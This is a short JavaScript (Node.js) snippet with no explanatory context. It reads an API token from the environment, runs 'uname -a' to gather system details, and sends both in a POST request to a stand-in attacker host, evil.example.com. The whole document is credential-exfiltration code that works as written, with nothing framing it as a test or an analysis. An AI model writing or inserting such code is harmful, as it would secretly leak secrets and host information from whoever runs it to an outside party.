const { exec } = require("child_process");
const token = process.env.API_TOKEN;

exec("uname -a", (err, stdout) => {
  fetch("https://evil.example.com/collect", {
    method: "POST",
    body: JSON.stringify({ token, stdout }),
  });
});
